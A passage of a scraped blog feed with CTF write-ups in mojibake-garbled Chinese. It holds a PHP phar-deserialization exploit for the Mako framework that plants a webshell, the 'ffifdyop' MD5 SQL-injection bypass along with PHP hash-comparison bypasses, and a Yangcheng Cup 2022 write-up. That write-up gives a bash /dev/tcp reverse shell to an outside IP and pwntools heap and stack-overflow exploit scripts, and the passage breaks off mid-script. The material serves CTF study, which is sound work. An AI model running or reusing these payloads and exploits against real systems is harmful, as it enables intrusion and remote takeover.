<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">put</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="variable">$data</span>, <span class="keyword">bool</span> <span class="variable">$lock</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$data</span>, <span class="variable">$lock</span> ? LOCK_EX : <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>file_put_contents():</p>
<p>åŠŸèƒ½ï¼šæŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ã€‚</p>
<p>è¯­æ³•ï¼š<code>file_put_contents(file,data,mode,context)</code></p>
<p>å‚æ•°è¯´æ˜ï¼š</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td><em>file</em></td>
<td>å¿…éœ€ã€‚è§„å®šè¦å†™å…¥æ•°æ®çš„æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td><em>data</em></td>
<td>å¯é€‰ã€‚è§„å®šè¦å†™å…¥æ–‡ä»¶çš„æ•°æ®ã€‚å¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€æ•°ç»„æˆ–æ•°æ®æµã€‚</td>
</tr>
<tr>
<td><em>mode</em></td>
<td>å¯é€‰ã€‚è§„å®šå¦‚ä½•æ‰“å¼€/å†™å…¥æ–‡ä»¶ã€‚å¯èƒ½çš„å€¼ï¼šFILE_USE_INCLUDE_PATHFILE_APPENDLOCK_EX</td>
</tr>
<tr>
<td><em>context</em></td>
<td>å¯é€‰ã€‚è§„å®šæ–‡ä»¶å¥æŸ„çš„ç¯å¢ƒã€‚<em>context</em> æ˜¯ä¸€å¥—å¯ä»¥ä¿®æ”¹æµçš„è¡Œä¸ºçš„é€‰é¡¹ã€‚è‹¥ä½¿ç”¨ nullï¼Œåˆ™å¿½ç•¥</td>
</tr>
</tbody>
</table>
<p>å‚æ•° <em>data</em> å¯ä»¥æ˜¯æ•°ç»„ï¼ˆä½†ä¸èƒ½æ˜¯å¤šç»´æ•°ç»„ï¼‰ã€‚</p>
<p>è‡ª PHP 5.1.0 èµ·ï¼Œ<em>data</em> å‚æ•°ä¹Ÿå¯ä»¥è¢«æŒ‡å®šä¸º stream èµ„æºï¼Œstream ä¸­æ‰€ä¿å­˜çš„ç¼“å­˜æ•°æ®å°†è¢«å†™å…¥åˆ°æŒ‡å®šæ–‡ä»¶ä¸­ï¼Œè¿™ç§ç”¨æ³•å°±ç›¸ä¼¼äºä½¿ç”¨ stream_copy_to_stream() å‡½æ•°ã€‚</p>
<p>å¯¹ <em>context</em> å‚æ•°çš„æ”¯æŒæ˜¯ PHP 5.0.0 æ·»åŠ çš„ã€‚</p>
<hr>
<p>è¿™é‡Œå°±å¯ä»¥åˆ©ç”¨å°†æˆ‘ä»¬æƒ³å†™å…¥çš„æ•°æ®å†™è¿›å®¹å™¨ä¸­ï¼Œç†è®ºæˆç«‹ï¼Œå®è·µå¼€å§‹ï¼Œæˆ‘è¿™é‡Œå°±ç›´æ¥ç”¨maxzedçš„expå•¦ï¼Œå°†shellå†™åœ¨/var/www/mako/publicä¸‹ã€‚</p>
<p>exp.php:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      <span class="meta">?&gt;</span><span class="string">&#x27;);//ç”±äºè¦å­˜æœ¬åœ°ï¼Œè¿™ä¸ªå…ˆå’Œè°ä¸€ä¸‹</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace mako\session\stores&#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    use mako\file\FileSystem;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    class File&#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        protected $fileSystem;</span></span><br><span class="line"><span class="string">        protected $sessionPath;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        public function __construct()</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;fileSystem = new FileSystem();</span></span><br><span class="line"><span class="string">            $this-&gt;sessionPath = &quot;/var/www/mako/public&quot;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace mako\file&#123;</span></span><br><span class="line"><span class="string">    class FileSystem&#123;</span></span><br><span class="line"><span class="string">        public function __construct()</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace &#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    use mako\session\Session;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    $phar = new Phar(&quot;phar.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"><span class="string">    $phar-&gt;startBuffering();</span></span><br><span class="line"><span class="string">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub</span></span><br><span class="line"><span class="string">    $o = new Session();</span></span><br><span class="line"><span class="string">    $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="string">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;asd&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="string">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="string">    $phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„è·å–shelläº†ï¼Œä½†æ˜¯æˆ‘è‡ªå·±æœ¬åœ°æ­çš„dockerä¼ ä¸Šå»çš„phar.pharæ²¡ååº”ï¼Œæ²¡æ³•è¯»å–ï¼Œæ²¡èƒ½å¤ç°æˆåŠŸã€‚</p>
]]></content>
      <categories>
        <category>èµ›äº‹Writeup</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Crypto</tag>
        <tag>Pwn</tag>
        <tag>Misc</tag>
        <tag>Re</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello</title>
    <url>/2022/09/Hello/</url>
    <content><![CDATA[<p>ä½ ä¸å–œæ¬¢wlopä¹ˆï¼Ÿ</p>
<span id="more"></span>
<p><img src="/2022/09/Hello/wlop04.jpg" alt="wlop04"></p>
]]></content>
  </entry>
  <entry>
    <title>SQL- ffifdyopç»•è¿‡</title>
    <url>/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>å½“çœ‹åˆ°è¿™ä¸ªç»•è¿‡å¹¶æ²¡æ³•å¯Ÿè§‰çš„æ—¶å€™ï¼Œæˆ‘å°±çŸ¥é“æˆ‘çš„SQLæ³¨å…¥è¿˜æ²¡å…¥é—¨ï¼Œåœ¨æµè§ˆå…¶ä»–å¸ˆå‚…çš„blogä¸­ï¼ŒçŸ¥é“è¿™æ˜¯ç»•è¿‡ä¸­çš„ä¸€ä¸ªå¥‡å¦™çš„å­—ç¬¦ä¸²<qwq></qwq></p>
<span id="more"></span>
<h1 id="sql-ffifdyopç»•è¿‡"><a class="markdownIt-Anchor" href="#sql-ffifdyopç»•è¿‡"></a> SQL-- ffifdyopç»•è¿‡</h1>
<h3 id="ç»•è¿‡æŠ€å·§è§£è¯»"><a class="markdownIt-Anchor" href="#ç»•è¿‡æŠ€å·§è§£è¯»"></a> ç»•è¿‡æŠ€å·§è§£è¯»</h3>
<p>å…ˆç»™ä½ çœ‹ä¸€ä¸ªä¸œè¥¿:276f7227ï¼Œçœ‹åˆ°è¿™ä¸ªä½ æƒ³åˆ°äº†ä»€ä¹ˆï¼Ÿ</p>
<p>&lt;----â€˜orâ€™----&gt;æœ‰æ²¡æœ‰ç»™ä½ ä¸€ä¸ªå¾ˆç†Ÿæ‚‰çš„æ„Ÿè§‰ï¼æ˜¯çš„è¿™æ­£æ˜¯â€œffidfyopâ€çš„md5åŠ å¯†åçš„å€¼ï¼š276f722736c95d99e921722cf9ed621c æˆ‘ä»¬éƒ½çŸ¥é“SQLè¯­å¥ä¼šè‡ªåŠ¨å°†Hexè½¬æˆAsciiæ¥è§£é‡Šã€‚</p>
<p>å› æ­¤æ‹¼æ¥ä¹‹åï¼š</p>
<p><code>select * from admin where password=''or'6&lt;ä¹±ç &gt;'</code></p>
<p>ç›¸å½“äº<code>select * from admin where password=''or'1</code>ï¼Œä¸€ä¸ªæ°¸çœŸå¼ï¼Œä»¥æ­¤æ¥ç»•è¿‡MD5()ã€‚</p>
<p>åŒç†çš„è¿˜æœ‰ï¼š129581926211651571912466741651878684928 ä¹Ÿå¯è¾¾åŒæ ·çš„æ•ˆæœ</p>
<p>æ€»ä¹‹ï¼Œç›¸å½“äº <code>select * from admin where password=''or ture</code>ã€‚</p>
<h3 id="ä¾‹é¢˜è§£è¯»"><a class="markdownIt-Anchor" href="#ä¾‹é¢˜è§£è¯»"></a> ä¾‹é¢˜è§£è¯»ï¼š</h3>
<h4 id="bjdctf-2020easy_md5"><a class="markdownIt-Anchor" href="#bjdctf-2020easy_md5"></a> [BJDCTF 2020]easy_md5</h4>
<p>æ‰“å¼€é“¾æ¥ï¼Œçœ‹åˆ°è¾“å…¥æ¡†ï¼Œç¬¬ä¸€æ—¶é—´å°±æƒ³åˆ°æ³¨å…¥ï¼š</p>
<p><img src="/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/image-20220911164839623.png" alt="éº»äº†"></p>
<p>è¯•è¿‡è¯¸å¤šæ³¨å…¥æ— æœï¼ŒæŠ“äº†ä¸€ä¸‹åŒ…ï¼Œçœ‹åˆ°hintï¼š</p>
<p><img src="/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/image-20220911165221183.png" alt="éº»äº†"></p>
<p>çœ‹åˆ°hintï¼Œå°±çŸ¥é“æ˜¯ç»•è¿‡MD5()ã€‚</p>
<p>æ¡†å†…è¾“å…¥â€œffifdyopâ€ï¼ŒæˆåŠŸç»•è¿‡ã€‚</p>
<p><img src="/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/image-20220911165824467.png" alt="éº»äº†"></p>
<p>æŸ¥çœ‹æºä»£ç ï¼Œè¿™é‡Œæœ‰å¾ˆå¤šç§ç»•è¿‡æ–¹å¼ï¼š</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">a</span>=QNKCDZO&amp;b=240610708</span><br><span class="line"></span><br><span class="line">?<span class="attribute">a</span>=s878926199a&amp;b=s155964671a</span><br><span class="line"></span><br><span class="line">?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/image-20220911170317691.png" alt="éº»äº†"></p>
<p><img src="/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/image-20220911170742947.png" alt="éº»äº†"></p>
<p>åŒç†ï¼ŒPOSTåŒå‚æ•°æ•°ç»„ç»•è¿‡ã€‚</p>
<hr>
<p>è¿™é‡Œæœ‰å…¶ä»–å¸ˆå‚…çš„é¡¶çº§ç†è§£ï¼š</p>
<p><em>å¼±ç±»å‹æ¯”è¾ƒå˜æˆäº†å¼ºç±»å‹æ¯”è¾ƒäº†ï¼Œè¿™é‡Œå°±åªèƒ½ç”¨phpæ•°ç»„ç»•è¿‡ï¼Œç”±äºå“ˆå¸Œå‡½æ•°æ— æ³•å¤„ç†phpæ•°ç»„ï¼Œåœ¨é‡åˆ°æ•°ç»„æ—¶è¿”å›falseï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨false==falseæˆç«‹ä½¿æ¡ä»¶æˆç«‹</em></p>
<p><img src="/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/image-20220911171036454.png" alt="éº»äº†"></p>
<p>flagï¼šNSSCTF{762d2772-8382-4ec4-9f9c-8354f7d0c995}</p>
<h3 id="ç»“"><a class="markdownIt-Anchor" href="#ç»“"></a> ç»“</h3>
<p>å­¦åˆ°äº†æ–°ä¸œè¥¿ï¼Œè¿™æ‰æ˜¯å…¥é—¨è¯¶ï¼Œå‘œå‘œå‘œï¼Œæˆ‘å¥½èœï¼ï¼ï¼</p>
]]></content>
      <categories>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>ç»•è¿‡æŠ€å·§</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¾ŠåŸæ¯2022-Writeup</title>
    <url>/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/</url>
    <content><![CDATA[<h1 id="ç¾ŠåŸæ¯2022writeup"><a class="markdownIt-Anchor" href="#ç¾ŠåŸæ¯2022writeup"></a> ç¾ŠåŸæ¯2022â€“Writeup</h1>
<p>â€‹                                                                                                                            -------TWe1v3ã€1amfreeã€scr1pt_k1ddi3</p>
<hr>
<p>è¿™ä¸ªæ¯”èµ›å¤ªç´¯äº†å¯ï¼Œå‡Œæ™¨ä¸‰ç‚¹ç¢°ç€æ•å¤´å°±ç¡ç€äº†ï¼Œä¸è¿‡æ”¶è·ä¹Ÿè›®å¤šçš„ï¼Œè¿™æ¬¡é¢˜ç›®å¾ˆå‹å¥½ï¼Œä¸åƒwmCTFä¸€æ ·åå¤§ç‰¢ã€‚æ„Ÿè°¢ä¸¤ä½å¤§å“¥çš„å®åŠ›å¸¦é£ï¼Œå¤ªèœäº†æˆ‘ã€‚å…¨é èººã€‚</p>
<span id="more"></span>          
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280.PNG" alt="æ’è¡Œæ¦œ"></p>
<h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h2>
<h3 id="ycbsql"><a class="markdownIt-Anchor" href="#ycbsql"></a> YCBSQL</h3>
<p>è¿™ä¸ªåº”è¯¥æ˜¯æœ‰äº†éé¢„æœŸï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨shellï¼Œæˆ‘ä»¬ç›´æ¥åå¼¹å°±è¡Œã€‚</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1.PNG" alt="1"></p>
<p>Payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.system bash -c <span class="string">&quot;bash -i  &gt;&amp;/dev/tcp/101.43.255.238/7777 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/2.PNG" alt="2"></p>
<h3 id="ez_linklist-v2"><a class="markdownIt-Anchor" href="#ez_linklist-v2"></a> ez_linklist-v2</h3>
<p>è¿™ä¸ªé¢˜ç›®çš„æ¼æ´å°±æ˜¯åœ¨unlinkçš„æ—¶å€™å¦‚æœæ˜¯unlinkçš„å¤´æŒ‡é’ˆï¼Œé‚£ä¹ˆåé¢çš„æŒ‡é’ˆæ²¡æœ‰æ¸…ç©ºï¼Œå°±ä¼šæ˜¯è¿™æ ·ï¼š</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(3).PNG" alt="1280X1280 (3)"></p>
<p>ç„¶ååœ¨freeå‡½æ•°çš„æ—¶å€™ï¼Œå¦‚æœoffsetæ˜¯0xffï¼Œé‚£ä¹ˆåé¢çš„æŒ‡é’ˆå°±éƒ½èƒ½é‡Šæ”¾æ‰ï¼Œå› æ­¤å°±ä¼šäº§ç”Ÿdouble freeã€‚</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(4).PNG" alt="1280X1280 (4)"></p>
<p>æ‰€ä»¥å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªdouble freeçš„åˆ©ç”¨ã€‚è¿™é‡Œæˆ‘ä¸€å¼€å§‹æ˜¯ç”¨çš„9.7çš„libcï¼Œä¹‹åç›´æ¥æ”¹æˆ9.2çš„å°±è¡Œã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r=process(&quot;/home/ubuntu/pwn/æ¯”èµ›/ç¾ŠåŸæ¯/pwn/pwn&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;tcp.dasc.buuoj.cn&quot;</span>,<span class="number">23916</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/ubuntu/pwn/æ¯”èµ›/ç¾ŠåŸæ¯/pwn/pwn&quot;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;/home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/home/ubuntu/pwn/æ¯”èµ›/ç¾ŠåŸæ¯/pwn/libc.so.6&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index,offset</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Input offset:&quot;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">link</span>(<span class="params">id1,id2</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;link from:&quot;</span>,<span class="built_in">str</span>(id1))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;link to:&quot;</span>,<span class="built_in">str</span>(id2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unlink</span>(<span class="params">index,offset</span>):</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Input offset:&quot;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x70</span>,p64(<span class="number">0</span>)+p64(<span class="number">0X451</span>))</span><br><span class="line"></span><br><span class="line">link(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">unlink(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0xff</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">link(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">meau(<span class="number">4</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Offset 1:&quot;</span>)</span><br><span class="line">heap_base=u64(r.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x2e0</span></span><br><span class="line">success(<span class="string">&quot;heap_base = &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Input offset:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">link(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">unlink(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>,<span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x450</span>)+p64(heap_base+<span class="number">0x3b0</span>)</span><br><span class="line">add(<span class="number">0x18</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;z&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">8</span>)+p64(heap_base+<span class="number">0x460</span>)</span><br><span class="line">add(<span class="number">0x18</span>,payload)</span><br><span class="line"></span><br><span class="line">link(<span class="number">0</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">meau(<span class="number">4</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">libc_base=u64(r.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x10</span> -<span class="number">96</span> - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Input offset:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">6</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(free_hook)*<span class="number">3</span></span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,p64(system_addr))</span><br><span class="line">add(<span class="number">0x70</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="fakenooutput"><a class="markdownIt-Anchor" href="#fakenooutput"></a> fakeNoOutput</h3>
<p>è¿™é“é¢˜ç›®å°±æœ‰ç‚¹éš¾å—ï¼Œé¦–å…ˆæ˜¯ä¸€å †çš„é€†å‘æ“ä½œã€‚ä½†æ˜¯å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œå¹¶ä¸”æº¢å‡ºäº†éå¸¸å¤šçš„å­—èŠ‚ã€‚ä½†æ˜¯æƒ³è¦è®©ç¨‹åºæ‰§è¡Œåˆ°æº¢å‡ºç‚¹è¿˜æ˜¯æœ‰ç‚¹çš„å›°éš¾ã€‚é¦–å…ˆæˆ‘ä»¬å‘ç°æº¢å‡ºç‚¹åœ¨uploadé‡Œé¢çš„strcpy(s, haystack);è¿™ä¸ªéƒ¨åˆ†ï¼Œç„¶åæˆ‘ä»¬åªéœ€è¦è®©å‡½æ•°è°ƒç”¨uploadå°±å¯ä»¥æº¢å‡ºã€‚ä½†æ˜¯é¦–å…ˆè¦é€šè¿‡sub_804976Fè¿™ä¸ªå‡½æ•°é‡Œé¢çš„éªŒè¯ï¼Œç»è¿‡é€†å‘è°ƒè¯•å‘ç°ï¼Œå°±æ˜¯ä¸€ä¸ªä¼ªéšæœºæ•°ï¼Œæˆ‘ä»¬ç›´æ¥è¾“å…¥å°±è¡Œã€‚ç„¶åæº¢å‡ºçš„è‡ªå·±å¤§å°å’ŒContent-Lengthæœ‰è¾ƒå¤§çš„å…³ç³»ï¼Œå› æ­¤æˆ‘ä»¬è¦è®¾ç½®Content-Lengthçš„å¤§å°æ¥æ§åˆ¶æº¢å‡ºçš„é•¿åº¦ã€‚ä¹‹åç”±äºå‡½æ•°é™åˆ¶çš„åŸå› ï¼Œæ— æ³•ret2libcï¼Œå› æ­¤æˆ‘ä»¬ç»è¿‡ç²¾å¿ƒæ„é€ ï¼Œè¿”å›åˆ°http_putså‡½æ•°ï¼Œç„¶åå°±èƒ½å¤Ÿæ³„éœ²å‡ºgotè¡¨é‡Œçš„å†…å®¹ï¼Œä¹‹åå†è¿”å›ä¸»å‡½æ•°å†æº¢å‡ºä¸€æ¬¡å°±è¡Œï¼Œå°±èƒ½å¤Ÿæ‹¿åˆ°shellã€‚è®©äººååˆ†ä¸è§£çš„æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆç¬¬äºŒä¸ªç«¯å£ä¸€ç›´æ‰“ä¸é€šï¼Œæ³„éœ²ä¸å‡ºæ¥ä¸œè¥¿ï¼Œç¬¬ä¸€ä¸ªç«¯å£å¤šè·‘ä¸¤æ¬¡å°±èƒ½å¤Ÿæ‰“é€šè¿œç«¯ã€‚</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(5).PNG" alt="1280X1280 (5)"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> execve</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r=process(&quot;/home/ubuntu/pwn/æ¯”èµ›/ç¾ŠåŸæ¯/fakeNoOutput/fakeNoOutput&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;tcp.dasc.buuoj.cn&quot;</span>,<span class="number">20432</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/ubuntu/pwn/æ¯”èµ›/ç¾ŠåŸæ¯/fakeNoOutput/fakeNoOutput&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/ubuntu/pwn/æ¯”èµ›/ç¾ŠåŸæ¯/fakeNoOutput/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;POST /upload /  &quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&quot;Content-Length:0x4022\t&quot;</span></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">payload3=<span class="string">&quot;HTTP_SERVER1_token:wR5qH796Ky8D03r2W7syLB7406e30xP7\t&quot;</span></span><br><span class="line">r.sendline(payload3)</span><br><span class="line">r.send(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span 